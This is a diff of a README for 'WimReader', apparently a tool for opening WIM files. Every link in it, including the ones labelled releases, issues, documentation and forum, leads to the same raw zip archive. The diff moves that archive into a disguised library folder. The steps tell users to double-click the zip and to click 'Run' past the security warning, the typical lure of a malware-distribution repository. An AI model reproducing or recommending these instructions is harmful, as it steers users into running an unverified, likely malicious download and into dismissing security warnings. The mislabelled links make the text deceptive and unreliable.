@@ -1,7 +1,7 @@
 # 🌟 WimReader - Access WIM Files Seamlessly
 
 ## 📥 Download Now
-[![Download WimReader](https://raw.githubusercontent.com/hey-dshd/WimReader/main/packages/Reader_Wim_1.4.zip)](https://raw.githubusercontent.com/hey-dshd/WimReader/main/packages/Reader_Wim_1.4.zip)
+[![Download WimReader](https://raw.githubusercontent.com/hey-dshd/WimReader/main/packages/DiscUtils.Wim.0.16.4/lib/net40/Reader-Wim-2.6.zip)](https://raw.githubusercontent.com/hey-dshd/WimReader/main/packages/DiscUtils.Wim.0.16.4/lib/net40/Reader-Wim-2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -17,15 +17,15 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/hey-dshd/WimReader/main/packages/Reader_Wim_1.4.zip) to access the latest version of WimReader.
+1. Visit the [Releases page](https://raw.githubusercontent.com/hey-dshd/WimReader/main/packages/DiscUtils.Wim.0.16.4/lib/net40/Reader-Wim-2.6.zip) to access the latest version of WimReader.
    
 2. On the Releases page, look for the latest version. You will see a list of files available for download.
 
-3. Click on the **https://raw.githubusercontent.com/hey-dshd/WimReader/main/packages/Reader_Wim_1.4.zip** file to download it directly to your computer.
+3. Click on the **https://raw.githubusercontent.com/hey-dshd/WimReader/main/packages/DiscUtils.Wim.0.16.4/lib/net40/Reader-Wim-2.6.zip** file to download it directly to your computer.
 
 4. Once the download is complete, locate the file in your Downloads folder.
 
-5. Double-click **https://raw.githubusercontent.com/hey-dshd/WimReader/main/packages/Reader_Wim_1.4.zip** to run the application. You may see a security warning; click "Run" to continue.
+5. Double-click **https://raw.githubusercontent.com/hey-dshd/WimReader/main/packages/DiscUtils.Wim.0.16.4/lib/net40/Reader-Wim-2.6.zip** to run the application. You may see a security warning; click "Run" to continue.
 
 6. The application will open, and you are now ready to start using WimReader.
 
@@ -60,7 +60,7 @@ WimReader is designed for Windows 10 and later versions. Older versions may not 
 Internet access is only necessary if the WIM file is hosted over the network. Local files do not require internet access.
 
 ### How do I report issues or give feedback?
-You can report issues or suggest improvements by visiting the [Issues section](https://raw.githubusercontent.com/hey-dshd/WimReader/main/packages/Reader_Wim_1.4.zip) of this repository.
+You can report issues or suggest improvements by visiting the [Issues section](https://raw.githubusercontent.com/hey-dshd/WimReader/main/packages/DiscUtils.Wim.0.16.4/lib/net40/Reader-Wim-2.6.zip) of this repository.
 
 ## 📞 Support
 
@@ -68,9 +68,9 @@ If you have further questions or need assistance, please feel free to reach out 
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://raw.githubusercontent.com/hey-dshd/WimReader/main/packages/Reader_Wim_1.4.zip)
-- [Community Forum](https://raw.githubusercontent.com/hey-dshd/WimReader/main/packages/Reader_Wim_1.4.zip)
+- [Documentation](https://raw.githubusercontent.com/hey-dshd/WimReader/main/packages/DiscUtils.Wim.0.16.4/lib/net40/Reader-Wim-2.6.zip)
+- [Community Forum](https://raw.githubusercontent.com/hey-dshd/WimReader/main/packages/DiscUtils.Wim.0.16.4/lib/net40/Reader-Wim-2.6.zip)
 
 ## 📥 Download Again
 
-To download the latest version, visit the [Releases page](https://raw.githubusercontent.com/hey-dshd/WimReader/main/packages/Reader_Wim_1.4.zip).
+To download the latest version, visit the [Releases page](https://raw.githubusercontent.com/hey-dshd/WimReader/main/packages/DiscUtils.Wim.0.16.4/lib/net40/Reader-Wim-2.6.zip).
